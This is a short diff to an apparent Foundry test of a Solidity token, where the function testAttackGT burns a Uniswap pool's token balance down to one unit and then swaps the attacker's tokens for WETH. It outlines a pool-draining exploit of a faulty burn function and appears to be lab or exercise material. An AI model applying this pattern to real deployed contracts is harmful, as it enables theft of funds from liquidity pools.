@@ -57,7 +57,6 @@ contract TokenBurnTest is Test {
 
     function testAttackGT() public {
         token.approve(address(uniswap), UINT256_MAX);
-        weth.approve(address(uniswap), UINT256_MAX);
         token.burn(address(uniswap), token.balanceOf(address(uniswap)) - 1);
         uniswap.swapTokenToWETH(token.balanceOf(attacker));
         require(attackGoal(), "Attack Failed!");
